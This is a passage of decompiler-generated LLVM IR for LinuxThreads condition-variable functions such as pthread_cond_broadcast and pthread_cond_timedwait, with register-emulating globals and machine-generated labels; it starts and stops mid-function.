  store i1 %v1_804e1e5, i1* %zf.global-to-local, align 1
  br i1 %v1_804e1e5, label %dec_label_pc_804e1fc, label %dec_label_pc_804e1e9

dec_label_pc_804e1e9:                             ; preds = %dec_label_pc_804e1da
  %v3_804e1e5 = trunc i32 %v3_804e1da to i8
  %v5_804e1ee = add i32 %v3_804e1da, 4
  %v6_804e1ee = inttoptr i32 %v5_804e1ee to i32*
  %v7_804e1ee = load i32, i32* %v6_804e1ee, align 4
  call void @__pseudo_call(i32 %v7_804e1ee)
  %v0_804e1f1 = load i32, i32* @esp, align 4
  %v6_804e1f1 = icmp eq i32 %v0_804e1f1, -16
  store i1 %v6_804e1f1, i1* %zf.global-to-local, align 1
  store i32 %v3_804e1da, i32* @esi, align 4
  %v3_804e1f6 = add i32 %v3_804e1a1, 440
  %v4_804e1f6 = inttoptr i32 %v3_804e1f6 to i8*
  store i8 %v3_804e1e5, i8* %v4_804e1f6, align 1
  br label %dec_label_pc_804e1fc

dec_label_pc_804e1fc:                             ; preds = %dec_label_pc_804e1da, %dec_label_pc_804e1e9
  %v0_804e1fc = load i32, i32* @esp, align 4
  %v9_804e1fc = icmp eq i32 %v0_804e1fc, 12
  store i1 %v9_804e1fc, i1* %zf.global-to-local, align 1
  %v0_804e1ff = load i32, i32* @edi, align 4
  %v1_804e200 = inttoptr i32 %v0_804e1ff to i32*
  %v2_804e200 = call i32 @__pthread_unlock(i32* %v1_804e200)
  %v0_804e208 = load i32, i32* @esi, align 4
  %v1_804e208 = icmp eq i32 %v0_804e208, 0
  store i1 %v1_804e208, i1* %zf.global-to-local, align 1
  br i1 %v1_804e208, label %dec_label_pc_804e217, label %dec_label_pc_804e20c

dec_label_pc_804e20c:                             ; preds = %dec_label_pc_804e1fc
  store i1 false, i1* %zf.global-to-local, align 1
  %v1_804e210 = call i32 @__pthread_restart_new(i32 %v3_804e1a1)
  br label %dec_label_pc_804e225

dec_label_pc_804e217:                             ; preds = %dec_label_pc_804e1fc
  %v0_804e219 = load i32, i32* @global_var_80626ec.155, align 4
  %v2_804e220 = call i32 @kill(i32 %v0_804e219, i32 0)
  br label %dec_label_pc_804e225

dec_label_pc_804e225:                             ; preds = %dec_label_pc_804e20c, %dec_label_pc_804e1cf, %dec_label_pc_804e217
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804e227

dec_label_pc_804e227:                             ; preds = %dec_label_pc_804e1ad, %dec_label_pc_804e225
  %storemerge = phi i32 [ 3, %dec_label_pc_804e1ad ], [ 0, %dec_label_pc_804e225 ]
  %v0_804e227 = load i32, i32* @esp, align 4
  %v9_804e227 = icmp eq i32 %v0_804e227, -28
  store i1 %v9_804e227, i1* %zf.global-to-local, align 1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_804e1da, { 2, 3, 0, 1 }
  uselistorder i1 %v15_804e1a8, { 1, 0 }
  uselistorder i32 %v3_804e1a1, { 1, 2, 0, 4, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_804e227, { 1, 0 }
  uselistorder label %dec_label_pc_804e225, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e1fc, { 1, 0 }
}

define i32 @enqueue.9() local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue.10() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e24d = load i32, i32* @ebx, align 4
  store i32 %v0_804e24d, i32* %stack_var_-4, align 4
  %v0_804e24e = load i32, i32* @eax, align 4
  br label %dec_label_pc_804e26c

dec_label_pc_804e252:                             ; preds = %dec_label_pc_804e26c
  %v1_804e252 = load i32, i32* @edx, align 4
  %v12_804e252 = icmp eq i32 %v2_804e26c, %v1_804e252
  %v1_804e254 = icmp eq i1 %v12_804e252, false
  %v1_804e269 = add i32 %v2_804e26c, 8
  br i1 %v1_804e254, label %dec_label_pc_804e26c, label %dec_label_pc_804e256

dec_label_pc_804e256:                             ; preds = %dec_label_pc_804e252
  %v2_804e256 = inttoptr i32 %v1_804e269 to i32*
  %v3_804e256 = load i32, i32* %v2_804e256, align 4
  store i32 %v3_804e256, i32* %v1_804e26c, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v2_804e256, align 4
  %v2_804e274.pre = load i32, i32* %stack_var_-4, align 4
  %v0_804e275.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e274

dec_label_pc_804e26c:                             ; preds = %dec_label_pc_804e252, %entry
  %v1_804e259 = phi i32 [ %v0_804e24e, %entry ], [ %v1_804e269, %dec_label_pc_804e252 ]
  %v1_804e26c = inttoptr i32 %v1_804e259 to i32*
  %v2_804e26c = load i32, i32* %v1_804e26c, align 4
  %v1_804e26e = icmp eq i32 %v2_804e26c, 0
  %v1_804e270 = icmp eq i1 %v1_804e26e, false
  br i1 %v1_804e270, label %dec_label_pc_804e252, label %dec_label_pc_804e272

dec_label_pc_804e272:                             ; preds = %dec_label_pc_804e26c
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e274

dec_label_pc_804e274:                             ; preds = %dec_label_pc_804e256, %dec_label_pc_804e272
  %v0_804e275 = phi i32 [ %v0_804e275.pre, %dec_label_pc_804e256 ], [ 0, %dec_label_pc_804e272 ]
  %v2_804e274 = phi i32 [ %v2_804e274.pre, %dec_label_pc_804e256 ], [ %v0_804e24d, %dec_label_pc_804e272 ]
  store i32 %v2_804e274, i32* @ebx, align 4
  ret i32 %v0_804e275

; uselistorder directives
  uselistorder i32 %v2_804e26c, { 2, 0, 1 }
  uselistorder i32* %v1_804e26c, { 1, 0 }
  uselistorder i32 %v1_804e269, { 1, 0 }
  uselistorder label %dec_label_pc_804e274, { 1, 0 }
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  store i32 %tmp1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %arg1, align 4
  %v1_804e280 = add i32 %tmp1, 4
  %v2_804e280 = inttoptr i32 %v1_804e280 to i32*
  store i32 0, i32* %v2_804e280, align 4
  %v0_804e287 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e287 = add i32 %v0_804e287, 8
  %v2_804e287 = inttoptr i32 %v1_804e287 to i32*
  store i32 0, i32* %v2_804e287, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0
}

define i32 @__GI_pthread_cond_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 16
}

define i32 @pthread_condattr_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_condattr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_condattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_condattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %tmp2 = or i32 %arg1, 1
  %tmp3 = icmp eq i32 %tmp2, 1
  br i1 %tmp3, label %dec_label_pc_804e2c2, label %dec_label_pc_804e2c9

dec_label_pc_804e2c2:                             ; preds = %entry
  br label %dec_label_pc_804e2c9

dec_label_pc_804e2c9:                             ; preds = %entry, %dec_label_pc_804e2c2
  %v0_804e2c9 = phi i32 [ 22, %entry ], [ 38, %dec_label_pc_804e2c2 ]
  ret i32 %v0_804e2c9

; uselistorder directives
  uselistorder label %dec_label_pc_804e2c9, { 1, 0 }
}

define i32 @__pthread_set_own_extricate_if.11(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804e2ca = load i32, i32* @esi, align 4
  %v0_804e2cb = load i32, i32* @ebx, align 4
  %v0_804e2cf = load i32, i32* @eax, align 4
  store i32 %v0_804e2cf, i32* @ebx, align 4
  %v0_804e2d1 = load i32, i32* @edx, align 4
  store i32 %v0_804e2d1, i32* @esi, align 4
  %v1_804e2d3 = icmp eq i32 %v0_804e2d1, 0
  br i1 %v1_804e2d3, label %dec_label_pc_804e2df, label %dec_label_pc_804e2d7

dec_label_pc_804e2d7:                             ; preds = %entry
  %v1_804e2d7 = add i32 %v0_804e2cf, 64
  %v2_804e2d7 = inttoptr i32 %v1_804e2d7 to i8*
  %v3_804e2d7 = load i8, i8* %v2_804e2d7, align 1
  %v4_804e2d7 = icmp eq i8 %v3_804e2d7, 0
  %v1_804e2db = icmp eq i1 %v4_804e2d7, false
  br i1 %v1_804e2db, label %dec_label_pc_804e301, label %dec_label_pc_804e2e9

dec_label_pc_804e2df:                             ; preds = %entry
  %v1_804e2df = add i32 %v0_804e2cf, 28
  %v2_804e2df = inttoptr i32 %v1_804e2df to i32*
  %v3_804e2df = load i32, i32* %v2_804e2df, align 4
  store i32 %v3_804e2df, i32* @eax, align 4
  store i32 %v0_804e2cf, i32* @edx, align 4
  %v1_804e2e4 = call i32 @__pthread_lock(i32 %v0_804e2cb)
  %v1_804e2e9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e2e9

dec_label_pc_804e2e9:                             ; preds = %dec_label_pc_804e2d7, %dec_label_pc_804e2df
  %v1_804e2e9 = phi i32 [ %v0_804e2cf, %dec_label_pc_804e2d7 ], [ %v1_804e2e9.pre, %dec_label_pc_804e2df ]
  %v2_804e2e9 = add i32 %v1_804e2e9, 444
  %v3_804e2e9 = inttoptr i32 %v2_804e2e9 to i32*
  store i32 %v0_804e2d1, i32* %v3_804e2e9, align 4
  %v1_804e2f1 = icmp eq i1 %v1_804e2d3, false
  br i1 %v1_804e2f1, label %dec_label_pc_804e301, label %dec_label_pc_804e2f3

dec_label_pc_804e2f3:                             ; preds = %dec_label_pc_804e2e9
  %v0_804e2f6 = load i32, i32* @ebx, align 4
  %v1_804e2f6 = add i32 %v0_804e2f6, 28
  %v2_804e2f6 = inttoptr i32 %v1_804e2f6 to i32*
  %v3_804e2f6 = load i32, i32* %v2_804e2f6, align 4
  %v1_804e2f9 = inttoptr i32 %v3_804e2f6 to i32*
  %v2_804e2f9 = call i32 @__pthread_unlock(i32* %v1_804e2f9)
  br label %dec_label_pc_804e301

dec_label_pc_804e301:                             ; preds = %dec_label_pc_804e2e9, %dec_label_pc_804e2d7, %dec_label_pc_804e2f3
  %v2_804e301 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804e2cb, i32* @ebx, align 4
  store i32 %v0_804e2ca, i32* @esi, align 4
  ret i32 %v2_804e301

; uselistorder directives
  uselistorder i1 %v1_804e2d3, { 1, 0 }
  uselistorder label %dec_label_pc_804e301, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e2e9, { 1, 0 }
}

define i32 @restart.12() local_unnamed_addr {
entry:
  %v0_804e308 = load i32, i32* @eax, align 4
  %v1_804e309 = call i32 @__pthread_restart_new(i32 %v0_804e308)
  ret i32 %v1_804e309
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e313 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804e31f = call i32 @__pthread_lock(i32 %v0_804e313)
  %v0_804e327 = load i32, i32* @ebx, align 4
  %v1_804e327 = add i32 %v0_804e327, 8
  %v2_804e327 = inttoptr i32 %v1_804e327 to i32*
  %v3_804e327 = load i32, i32* %v2_804e327, align 4
  store i32 %v3_804e327, i32* @esi, align 4
  store i32 0, i32* %v2_804e327, align 4
  %v0_804e331 = load i32, i32* @ebx, align 4
  %v1_804e332 = inttoptr i32 %v0_804e331 to i32*
  %v2_804e332 = call i32 @__pthread_unlock(i32* %v1_804e332)
  %v0_804e3561 = load i32, i32* @esi, align 4
  %v1_804e3562 = icmp eq i32 %v0_804e3561, 0
  %v1_804e3589 = icmp eq i1 %v1_804e3562, false
  br i1 %v1_804e3589, label %dec_label_pc_804e33c, label %dec_label_pc_804e35a

dec_label_pc_804e33c:                             ; preds = %entry, %dec_label_pc_804e33c
  %v0_804e33c = phi i32 [ %v0_804e356, %dec_label_pc_804e33c ], [ %v0_804e3561, %entry ]
  %v1_804e33c = add i32 %v0_804e33c, 8
  %v2_804e33c = inttoptr i32 %v1_804e33c to i32*
  %v3_804e33c = load i32, i32* %v2_804e33c, align 4
  store i32 %v3_804e33c, i32* @ebx, align 4
  %v1_804e33f = add i32 %v0_804e33c, 441
  %v2_804e33f = inttoptr i32 %v1_804e33f to i8*
  store i8 1, i8* %v2_804e33f, align 1
  %v0_804e346 = load i32, i32* @esi, align 4
  %v1_804e346 = add i32 %v0_804e346, 8
  %v2_804e346 = inttoptr i32 %v1_804e346 to i32*
  store i32 0, i32* %v2_804e346, align 4
  %v0_804e34d = load i32, i32* @esi, align 4
  store i32 %v0_804e34d, i32* @eax, align 4
  %v0_804e34f = load i32, i32* @ebx, align 4
  store i32 %v0_804e34f, i32* @esi, align 4
  %v0_804e351 = call i32 @restart.12()
  %v0_804e356 = load i32, i32* @esi, align 4
  %v1_804e356 = icmp eq i32 %v0_804e356, 0
  %v1_804e358 = icmp eq i1 %v1_804e356, false
  br i1 %v1_804e358, label %dec_label_pc_804e33c, label %dec_label_pc_804e35a

dec_label_pc_804e35a:                             ; preds = %dec_label_pc_804e33c, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_804e356, { 1, 0 }
  uselistorder i32 %v0_804e33c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e33c, { 1, 0 }
}

define i32 @thread_self.13(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804e367 = load i32, i32* @esp, align 4
  %v1_804e367 = load i32, i32* @global_var_8062fec.134, align 4
  %v7_804e367 = icmp ult i32 %v0_804e367, %v1_804e367
  %v1_804e36d = icmp eq i1 %v7_804e367, false
  br i1 %v1_804e36d, label %dec_label_pc_804e39e, label %dec_label_pc_804e36f

dec_label_pc_804e36f:                             ; preds = %entry
  %v1_804e36f = load i32, i32* @global_var_8062ff0.135, align 16
  %v7_804e36f = icmp ult i32 %v0_804e367, %v1_804e36f
  br i1 %v7_804e36f, label %dec_label_pc_804e384, label %dec_label_pc_804e377

dec_label_pc_804e377:                             ; preds = %dec_label_pc_804e36f
  %v1_804e37c = load i32, i32* @global_var_8062ff4.137, align 4
  %v7_804e37c = icmp ult i32 %v0_804e367, %v1_804e37c
  br i1 %v7_804e37c, label %dec_label_pc_804e39e, label %dec_label_pc_804e384

dec_label_pc_804e384:                             ; preds = %dec_label_pc_804e377, %dec_label_pc_804e36f
  %v0_804e384 = load i32, i32* @global_var_8067650.138, align 16
  %v1_804e384 = icmp eq i32 %v0_804e384, 0
  br i1 %v1_804e384, label %dec_label_pc_804e392, label %dec_label_pc_804e38d

dec_label_pc_804e38d:                             ; preds = %dec_label_pc_804e384
  %v0_804e38d = call i32 @__pthread_find_self()
  br label %dec_label_pc_804e392

dec_label_pc_804e392:                             ; preds = %dec_label_pc_804e384, %dec_label_pc_804e38d
  %v2_804e398 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804e39e

dec_label_pc_804e39e:                             ; preds = %dec_label_pc_804e377, %entry, %dec_label_pc_804e392
  %v0_804e39e = phi i32 [ ptrtoint (i32* @global_var_8062500.136 to i32), %dec_label_pc_804e377 ], [ ptrtoint (i32* @global_var_8062320 to i32), %entry ], [ %v2_804e398, %dec_label_pc_804e392 ]
  ret i32 %v0_804e39e

; uselistorder directives
  uselistorder label %dec_label_pc_804e39e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e392, { 1, 0 }
}

define i32 @cond_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804e39f = load i32, i32* @esi, align 4
  %v0_804e3a0 = load i32, i32* @ebx, align 4
  %v2_804e3a4 = call i32 @thread_self.13(i32 %v0_804e3a0, i32 %v0_804e39f)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v2_804e3a4, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804e3b7 = call i32 @__pthread_lock(i32 %v2_804e3a4)
  store i32 %arg2, i32* @edx, align 4
  %v0_804e3c0 = load i32, i32* @ebx, align 4
  %v1_804e3c0 = add i32 %v0_804e3c0, 8
  store i32 %v1_804e3c0, i32* @eax, align 4
  %v0_804e3c3 = call i32 @remove_from_queue.10()
  store i32 %v0_804e3c3, i32* @esi, align 4
  %v0_804e3cd = load i32, i32* @ebx, align 4
  %v1_804e3ce = inttoptr i32 %v0_804e3cd to i32*
  %v2_804e3ce = call i32 @__pthread_unlock(i32* %v1_804e3ce)
  %v0_804e3d3 = load i32, i32* @esi, align 4
  ret i32 %v0_804e3d3

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend.14() local_unnamed_addr {
entry:
  %v0_804e3de = load i32, i32* @eax, align 4
  %v1_804e3df = call i32 @__pthread_wait_for_restart_signal(i32 %v0_804e3de)
  ret i32 %v1_804e3df
}

define i32 @__GI_pthread_cond_timedwait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e3ea = load i32, i32* @esi, align 4
  %v0_804e3eb = load i32, i32* @ebx, align 4
  store i32 %v0_804e3eb, i32* %stack_var_-16, align 4
  %v4_804e3eb = ptrtoint i32* %stack_var_-16 to i32
  %v2_804e3ef = call i32 @thread_self.13(i32 %v0_804e3eb, i32 %v0_804e3ea)
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804e400 = add i32 %arg2, 12
  %v2_804e400 = inttoptr i32 %v1_804e400 to i32*
  %v3_804e400 = load i32, i32* %v2_804e400, align 4
  %v9_804e403 = icmp eq i32 %v3_804e400, 3
  br i1 %v9_804e403, label %dec_label_pc_804e41e, label %dec_label_pc_804e408

dec_label_pc_804e408:                             ; preds = %entry
  %v1_804e408 = icmp eq i32 %v3_804e400, 0
  br i1 %v1_804e408, label %dec_label_pc_804e41e, label %dec_label_pc_804e40c

dec_label_pc_804e40c:                             ; preds = %dec_label_pc_804e408
  %v1_804e415 = add i32 %arg2, 8
  %v2_804e415 = inttoptr i32 %v1_804e415 to i32*
  %v3_804e415 = load i32, i32* %v2_804e415, align 4
  %v15_804e415 = icmp eq i32 %v3_804e415, %v2_804e3ef
  %v1_804e418 = icmp eq i1 %v15_804e415, false
  br i1 %v1_804e418, label %dec_label_pc_804e40c.dec_label_pc_804e590_crit_edge, label %dec_label_pc_804e41e

dec_label_pc_804e40c.dec_label_pc_804e590_crit_edge: ; preds = %dec_label_pc_804e40c
  br label %dec_label_pc_804e590

dec_label_pc_804e41e:                             ; preds = %dec_label_pc_804e40c, %dec_label_pc_804e408, %entry
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v2_804e42e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804e42e, i32* @edx, align 4
  %v1_804e432 = add i32 %v2_804e3ef, 441
  %v2_804e432 = inttoptr i32 %v1_804e432 to i8*
  store i8 0, i8* %v2_804e432, align 1
  store i32 %v2_804e3ef, i32* @eax, align 4
  %v0_804e43d = load i32, i32* %stack_var_-28, align 4
  %v2_804e43d = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e43d, i32 134538143)
  %v0_804e442 = load i32, i32* @esi, align 4
  store i32 %v0_804e442, i32* @eax, align 4
  store i32 %v2_804e3ef, i32* @edx, align 4
  %v1_804e448 = call i32 @__pthread_lock(i32 134538143)
  %v1_804e451 = add i32 %v2_804e3ef, 66
  %v2_804e451 = inttoptr i32 %v1_804e451 to i8*
  %v3_804e451 = load i8, i8* %v2_804e451, align 1
  %v4_804e451 = icmp eq i8 %v3_804e451, 0
  br i1 %v4_804e451, label %dec_label_pc_804e466, label %dec_label_pc_804e457

dec_label_pc_804e457:                             ; preds = %dec_label_pc_804e41e
  store i32 1, i32* @ebx, align 4
  %v1_804e460 = add i32 %v2_804e3ef, 64
  %v2_804e460 = inttoptr i32 %v1_804e460 to i8*
  %v3_804e460 = load i8, i8* %v2_804e460, align 1
  %v4_804e460 = icmp eq i8 %v3_804e460, 0
  br i1 %v4_804e460, label %dec_label_pc_804e474, label %dec_label_pc_804e466

dec_label_pc_804e466:                             ; preds = %dec_label_pc_804e457, %dec_label_pc_804e41e
  store i32 %v2_804e3ef, i32* @edx, align 4
  %v0_804e46d = call i32 @enqueue.9()
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e474

dec_label_pc_804e474:                             ; preds = %dec_label_pc_804e457, %dec_label_pc_804e466
  %v0_804e477 = load i32, i32* @esi, align 4
  store i32 %v0_804e477, i32* %stack_var_-60, align 4
  %v1_804e478 = inttoptr i32 %v0_804e477 to i32*
  %v2_804e478 = call i32 @__pthread_unlock(i32* %v1_804e478)
  %v0_804e480 = load i32, i32* @ebx, align 4
  %v1_804e480 = icmp eq i32 %v0_804e480, 0
  br i1 %v1_804e480, label %dec_label_pc_804e496, label %dec_label_pc_804e484

dec_label_pc_804e484:                             ; preds = %dec_label_pc_804e474
  store i32 %v2_804e3ef, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804e48a = load i32, i32* %stack_var_-60, align 4
  %v1_804e48a = load i32, i32* %stack_var_-56, align 4
  %v2_804e48a = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e48a, i32 %v1_804e48a)
  br label %dec_label_pc_804e54c

dec_label_pc_804e496:                             ; preds = %dec_label_pc_804e474
  store i32 0, i32* @edi, align 4
  %v0_804e49b = load i32, i32* @ebp, align 4
  store i32 %v0_804e49b, i32* %stack_var_-60, align 4
  %v1_804e49c = call i32 @pthread_mutex_unlock(i32 %v0_804e49b)
  %v3_804e4af = inttoptr i32 %arg3 to i32*
  %v1_804e4fe = add i32 %v2_804e3ef, 440
  %v2_804e4fe = inttoptr i32 %v1_804e4fe to i8*
  %v1_804e50b = add i32 %v2_804e3ef, 64
  %v2_804e50b = inttoptr i32 %v1_804e50b to i8*
  br label %dec_label_pc_804e4a4

dec_label_pc_804e4a4:                             ; preds = %dec_label_pc_804e511, %dec_label_pc_804e496
  %v0_804e4a8 = load i32, i32* @edx, align 4
  store i32 %arg3, i32* %stack_var_-56, align 4
  store i32 %v2_804e3ef, i32* %stack_var_-60, align 4
  %v4_804e4af = call i32 @__pthread_timedsuspend_new(i32 %v2_804e3ef, i32* %v3_804e4af, i32 %v0_804e4a8)
  %v1_804e4b7 = icmp eq i32 %v4_804e4af, 0
  %v1_804e4b9 = icmp eq i1 %v1_804e4b7, false
  br i1 %v1_804e4b9, label %dec_label_pc_804e4ed, label %dec_label_pc_804e4bb

dec_label_pc_804e4bb:                             ; preds = %dec_label_pc_804e4a4
  store i32 %v2_804e3ef, i32* @edx, align 4
  %v0_804e4bf = load i32, i32* @esi, align 4
  store i32 %v0_804e4bf, i32* @eax, align 4
  %v0_804e4c1 = load i32, i32* %stack_var_-60, align 4
  %v1_804e4c1 = call i32 @__pthread_lock(i32 %v0_804e4c1)
  store i32 %v2_804e3ef, i32* @edx, align 4
  %v0_804e4ca = load i32, i32* @esi, align 4
  %v1_804e4ca = add i32 %v0_804e4ca, 8
  store i32 %v1_804e4ca, i32* @eax, align 4
  %v0_804e4cd = call i32 @remove_from_queue.10()
  store i32 %v0_804e4cd, i32* @ebx, align 4
  %v0_804e4d7 = load i32, i32* @esi, align 4
  store i32 %v0_804e4d7, i32* %stack_var_-60, align 4
  %v1_804e4d8 = inttoptr i32 %v0_804e4d7 to i32*
  %v2_804e4d8 = call i32 @__pthread_unlock(i32* %v1_804e4d8)
  %v1_804e4e0 = icmp eq i32 %v0_804e4cd, 0
  %v1_804e4e2 = icmp eq i1 %v1_804e4e0, false
  br i1 %v1_804e4e2, label %dec_label_pc_804e558, label %dec_label_pc_804e4e4

dec_label_pc_804e4e4:                             ; preds = %dec_label_pc_804e4bb
  store i32 %v2_804e3ef, i32* @eax, align 4
  %v0_804e4e8 = call i32 @suspend.14()
  br label %dec_label_pc_804e4ed

dec_label_pc_804e4ed:                             ; preds = %dec_label_pc_804e4a4, %dec_label_pc_804e4e4
  %v3_804e4f1 = load i8, i8* %v2_804e432, align 1
  %v4_804e4f1 = icmp eq i8 %v3_804e4f1, 0
  %v1_804e4f8 = icmp eq i1 %v4_804e4f1, false
  br i1 %v1_804e4f8, label %dec_label_pc_804e514, label %dec_label_pc_804e4fa

dec_label_pc_804e4fa:                             ; preds = %dec_label_pc_804e4ed
  %v3_804e4fe = load i8, i8* %v2_804e4fe, align 1
  %v4_804e4fe = icmp eq i8 %v3_804e4fe, 0
  br i1 %v4_804e4fe, label %dec_label_pc_804e511, label %dec_label_pc_804e507

dec_label_pc_804e507:                             ; preds = %dec_label_pc_804e4fa
  %v3_804e50b = load i8, i8* %v2_804e50b, align 1
  %v4_804e50b = icmp eq i8 %v3_804e50b, 0
  br i1 %v4_804e50b, label %dec_label_pc_804e514, label %dec_label_pc_804e511

dec_label_pc_804e511:                             ; preds = %dec_label_pc_804e507, %dec_label_pc_804e4fa
  %v0_804e511 = load i32, i32* @edi, align 4
  %v1_804e511 = add i32 %v0_804e511, 1
  store i32 %v1_804e511, i32* @edi, align 4
  br label %dec_label_pc_804e4a4

dec_label_pc_804e514:                             ; preds = %dec_label_pc_804e507, %dec_label_pc_804e4ed
  store i32 %v2_804e3ef, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804e51a = load i32, i32* %stack_var_-60, align 4
  %v1_804e51a = load i32, i32* %stack_var_-56, align 4
  %v2_804e51a = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e51a, i32 %v1_804e51a)
  %v3_804e523 = load i8, i8* %v2_804e4fe, align 1
  %v4_804e523 = icmp eq i8 %v3_804e523, 0
  br i1 %v4_804e523, label %dec_label_pc_804e57c.preheader, label %dec_label_pc_804e52c

dec_label_pc_804e52c:                             ; preds = %dec_label_pc_804e514
  %v3_804e530 = load i8, i8* %v2_804e50b, align 1
  %v4_804e530 = icmp eq i8 %v3_804e530, 0
  %v1_804e534 = icmp eq i1 %v4_804e530, false
  br i1 %v1_804e534, label %dec_label_pc_804e57c.preheader, label %dec_label_pc_804e536

dec_label_pc_804e57c.preheader:                   ; preds = %dec_label_pc_804e514, %dec_label_pc_804e52c
  %v0_804e57c19 = load i32, i32* @edi, align 4
  %v1_804e57c20 = add i32 %v0_804e57c19, -1
  store i32 %v1_804e57c20, i32* @edi, align 4
  %v10_804e57d26 = icmp eq i32 %v0_804e57c19, 0
  %v1_804e58027 = icmp eq i1 %v10_804e57d26, false
  br i1 %v1_804e58027, label %dec_label_pc_804e573, label %dec_label_pc_804e582

dec_label_pc_804e536:                             ; preds = %dec_label_pc_804e52c
  store i8 0, i8* %v2_804e4fe, align 1
  %v0_804e544 = load i32, i32* @ebp, align 4
  store i32 %v0_804e544, i32* %stack_var_-60, align 4
  %v1_804e545 = call i32 @pthread_mutex_lock(i32 %v0_804e544)
  store i32 %v0_804e544, i32* @ecx, align 4
  %v2_804e54b = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_804e54b, i32* @ebx, align 4
  br label %dec_label_pc_804e54c

dec_label_pc_804e54c:                             ; preds = %dec_label_pc_804e484, %dec_label_pc_804e536
  store i32 %v4_804e3eb, i32* %stack_var_-56, align 4
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_804e553 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804e3eb)
  br label %dec_label_pc_804e558

dec_label_pc_804e558:                             ; preds = %dec_label_pc_804e4bb, %dec_label_pc_804e54c
  store i32 %v2_804e3ef, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_804e55e = load i32, i32* %stack_var_-60, align 4
  %v1_804e55e = load i32, i32* %stack_var_-56, align 4
  %v2_804e55e = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e55e, i32 %v1_804e55e)
  %v0_804e566 = load i32, i32* @ebp, align 4
  store i32 %v0_804e566, i32* %stack_var_-60, align 4
  %v1_804e567 = call i32 @pthread_mutex_lock(i32 %v0_804e566)
  br label %dec_label_pc_804e58d

dec_label_pc_804e573:                             ; preds = %dec_label_pc_804e57c.preheader, %dec_label_pc_804e573
  store i32 %v2_804e3ef, i32* @eax, align 4
  %v0_804e577 = call i32 @restart.12()
  %v0_804e57c = load i32, i32* @edi, align 4
  %v1_804e57c = add i32 %v0_804e57c, -1
  store i32 %v1_804e57c, i32* @edi, align 4
  %v10_804e57d = icmp eq i32 %v0_804e57c, 0
  %v1_804e580 = icmp eq i1 %v10_804e57d, false
  br i1 %v1_804e580, label %dec_label_pc_804e573, label %dec_label_pc_804e582

dec_label_pc_804e582:                             ; preds = %dec_label_pc_804e573, %dec_label_pc_804e57c.preheader
  %v0_804e585 = load i32, i32* @ebp, align 4
  store i32 %v0_804e585, i32* %stack_var_-60, align 4
  %v1_804e586 = call i32 @pthread_mutex_lock(i32 %v0_804e585)
  br label %dec_label_pc_804e58d

dec_label_pc_804e58d:                             ; preds = %dec_label_pc_804e558, %dec_label_pc_804e582
  %storemerge1 = phi i32 [ 110, %dec_label_pc_804e558 ], [ 0, %dec_label_pc_804e582 ]
  br label %dec_label_pc_804e590

dec_label_pc_804e590:                             ; preds = %dec_label_pc_804e40c.dec_label_pc_804e590_crit_edge, %dec_label_pc_804e58d
